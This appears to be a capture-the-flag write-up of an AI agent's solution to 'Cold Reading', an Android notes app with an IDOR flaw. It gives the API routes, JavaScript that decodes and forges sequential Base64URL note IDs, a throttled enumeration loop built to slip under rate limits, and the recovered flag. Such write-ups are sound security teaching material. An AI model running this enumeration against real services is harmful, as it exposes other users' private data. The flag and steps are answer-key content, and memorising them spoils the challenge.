# Cold Reading
> Reconstructed from Codex task [019f9c71-cb1d-77f1-ba62-522af34abcd8](thread://019f9c71-cb1d-77f1-ba62-522af34abcd8). Confirmed flags require intended-workflow evidence; rejected candidates remain explicitly marked.

## Challenge statement and supplied material

**Name:** Cold Reading  
**Points:** 200

> Ghost Notes calls itself a private journal: every entry lives behind its own unguessable link, visible only to you. Install it, write a few notes, and test that promise, because the admin keeps a journal here too, and there is one entry they would rather you never read.

- APK: [https://ghost-notes.chetanr25.in/ghost-notes.apk](https://ghost-notes.chetanr25.in/ghost-notes.apk)
- Local APK size: 49,363,868 bytes
- SHA-256: `E89B5970F131DCF04C13A9F723F58E07164266F7FB00276DE241EC9A1BCA4F67`

## Category and status

- **Category:** Android reverse engineering plus web authorization/IDOR.
- **Status:** **Confirmed solved.**
- **Confirmed flag:** `pbctf{1d0r_by_pr3d1ct4bl3_1ds_1g}`

## High-level solution overview

The Android client exposes the Ghost Notes REST API. Note listings are scoped to the authenticated user, creating the appearance of privacy, but the single-note endpoint accepts any valid note ID without checking ownership. The IDs are not unguessable: they are Base64URL encodings of a four-byte little-endian counter that increments by exactly 11,111. Create a few notes to recover the pattern, enumerate backward at a rate the service permits, and use the IDOR to read the admin’s protected note.

## Detailed procedure

1. Download the APK and record its hash.

2. Extract/decompile it. The application is Flutter-based, so part of the useful behavior is in compiled `libapp.so`, but strings, routes, and traffic behavior are sufficient to identify the API.

3. Identify the REST surface:

   ```text
   POST /api/register
   POST /api/login
   GET  /api/notes
   POST /api/notes
   GET  /api/notes/{id}
   ```

   Base origin:

   ```text
   https://ghost-notes.chetanr25.in
   ```

4. Register a disposable test user and authenticate. Requests use:

   ```http
   Authorization: Bearer <token>
   Content-Type: application/json
   ```

5. Prove the IDOR safely:

   - Create a note as account A.
   - Authenticate as account B.
   - Request `GET /api/notes/<A-note-id>` using B’s Bearer token.
   - The server returns the note instead of `403`, proving missing object ownership enforcement.

6. Create a run of probe notes and inspect their IDs:

   ```text
   2L1LXw
   P-lLXw
   phRMXw
   DUBMXw
   ...
   ```

7. Decode an ID:

   ```javascript
   const v = Buffer.from(id, "base64url").readUInt32LE(0);
   ```

   Consecutive values differ by:

   ```text
   11111
   ```

8. Re-encode candidate prior IDs:

   ```javascript
   function encodeLE(v) {
     const b = Buffer.alloc(4);
     b.writeUInt32LE(v >>> 0);
     return b.toString("base64url");
   }
   candidate = encodeLE((lastValue - i * 11111) >>> 0);
   ```

9. Enumerate backward with the second test account. Preserve only admin/flag matches; do not collect unrelated participant note content.

10. The first parallel scan hit `429 Too Many Requests`. Switch to one request about every 220 ms and retry `429` responses after about 700 ms.

11. A predictable ID first exposed an admin `todo` note, validating the chain. Continuing backward reached admin note:

   ```text
   ID: Z0c6Xw
   ```

   Its body contained the flag.

## Important commands, endpoints, and code

```powershell
Get-FileHash -Algorithm SHA256 -LiteralPath 'C:\Users\kingg\Desktop\codex\cold-reading\ghost-notes.apk'
```

```javascript
const r = await fetch(base + "/api/notes/" + id, {
  headers: { authorization: "Bearer " + token }
});
```

JADX was run approximately as:

```powershell
jadx.bat -d 'C:\Users\kingg\Desktop\codex\cold-reading\decompiled' --show-bad-code 'C:\Users\kingg\Desktop\codex\cold-reading\ghost-notes.apk'
```

## Evidence and validation

- Cross-account read proved the item endpoint’s IDOR.
- Multiple newly created IDs decoded to a deterministic counter with step 11,111.
- Throttled enumeration returned an admin-owned note, not merely a guessed string.
- Admin note `Z0c6Xw` contained exactly:

  ```text
  pbctf{1d0r_by_pr3d1ct4bl3_1ds_1g}
  ```

This ties the token directly to the intended “admin journal” workflow.

## Failed approaches and non-flags

- Query parameters such as `?owner=admin`, `?username=admin`, `?user=admin`, `?all=true`, and `?limit=100` did not bypass list scoping; they still returned the authenticated user’s notes.
- Aggressive parallel enumeration caused `429`; it was a rate-control problem, not evidence against the exploit.
- The first admin `todo` entry was proof of access but did not contain the flag.

## Codex skills used

- `solve-challenge`
- `ctf-reverse`
- `ctf-web`

## Tools, utilities, libraries, and services

- PowerShell and `curl.exe`.
- JADX 1.5.5 and Java.
- ZIP/APK extraction tools.
- Node-backed REPL with JavaScript `fetch`, `Buffer`, and paced asynchronous enumeration.
- Ghost Notes REST service at `https://ghost-notes.chetanr25.in`.

## Local artifacts

- `C:\Users\kingg\Desktop\codex\cold-reading\ghost-notes.apk`
- `C:\Users\kingg\Desktop\codex\cold-reading\apk`
- `C:\Users\kingg\Desktop\codex\cold-reading\decompiled`
- `C:\Users\kingg\Desktop\codex\cold-reading\jadx`
- `C:\Users\kingg\Desktop\codex\cold-reading\jadx.zip`

The live access token and disposable account state were not saved as a reusable solver artifact.

## Diagram assessment

**Yes.** Suggested nodes and edges:

```text
APK → API discovery → account A creates note
account B + A's note ID → GET /api/notes/{id} → IDOR proven
probe IDs → Base64URL/LE decode → counter step 11111
backward enumeration → admin note Z0c6Xw → confirmed flag
```

---

## Final High-Level Overview

The app exposed a cross-account note-read IDOR, while Base64URL note IDs encoded a little-endian counter stepping by 11,111. Throttled backward enumeration reached an admin note whose body directly contained the confirmed flag.
